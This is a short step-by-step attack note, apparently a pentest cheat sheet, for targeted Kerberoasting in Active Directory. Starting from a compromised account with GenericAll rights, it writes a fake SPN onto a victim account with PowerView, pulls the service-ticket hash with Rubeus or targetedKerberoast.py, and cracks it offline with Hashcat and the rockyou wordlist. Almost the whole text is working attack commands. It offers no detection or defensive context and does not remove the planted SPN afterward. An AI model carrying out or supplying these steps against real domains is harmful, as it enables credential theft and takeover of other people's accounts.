# Creating a `Fake SPN` to perform Kerberoasting
**Prerequisite**: The compromised user must have **GenericAll** rights over the target account (e.g., `mohamed`) to modify its `servicePrincipalName` (SPN).  

##### **Steps**:  
1. **Modify the SPN to Create a Fake Service**:  
   - Use PowerView's `Set-DomainObject` to add a fake SPN:  
     ```powershell
     Set-DomainObject -Credential $Cred -Identity TARGET_USER -SET @{serviceprincipalname='fake/service'} -Verbose
     ```  
     *(Replace `TARGET_USER`, e.g., `mohamed`, and customize the fake SPN, e.g., `notahacker/LEGIT`).*  

2. **Request the TGS Ticket for the Fake SPN**:  
   - Use **Rubeus** to Kerberoast the user and retrieve the hash:  
     ```powershell
     .\Rubeus.exe kerberoast /user:TARGET_USER /nowrap
     ```  
   - **Linux Alternative**: Use `targetedKerberoast.py` to automate SPN creation/harvesting:  
     ```bash
     targetedKerberoast.py -d DOMAIN -u USER -p PASSWORD --request-user mohamed
     ```  

3. **Crack the Hash Offline**:  
   - Use **Hashcat** to crack the Kerberoasted hash (e.g., `RC4_HMAC` type):  
     ```bash
     hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
     ```  
